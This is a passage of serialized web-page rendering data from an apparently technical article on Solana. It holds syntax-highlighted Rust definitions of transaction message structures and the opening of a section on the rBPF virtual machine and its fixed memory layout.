token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Message\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],\"\\n\",[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Message\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" header\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MessageHeader\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Access type (read / write) of each accessed account\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account_keys\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Accounts accessed by the transaction\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" instructions\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CompiledInstruction\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Actions performed by the transaction\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],\"\\n\",[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MessageHeader\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_required_signatures\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_readonly_signed_accounts\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_readonly_unsigned_accounts\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],\"\\n\",[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" program_id\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"              \"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Program to execute\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Accounts this instruction will access\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data\"]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Instruction-specific data\"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"h3\",\"h3-2\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"The rBPF Virtual Machine\"}],\"\\n\",[\"$\",\"p\",\"p-17\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Solana programs are typically written in Rust and compiled to a variant of eBPF (extended Berkeley Packet Filter) bytecode. The validator executes this bytecode within a sandboxed virtual machine.\"}],\"\\n\",[\"$\",\"p\",\"p-18\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"For each transaction, the validator allocates a dedicated, isolated memory space for the VM. The virtual address memory map used by Solana SBF programs is fixed and laid out as follows:\"}],\"\\n\",[\"$\",\"pre\",\"pre-2\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x100000000\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CODE\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Program\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" executable bytecode\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x200000000\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"STACK\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Call\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"stack\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"4KB frames\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber 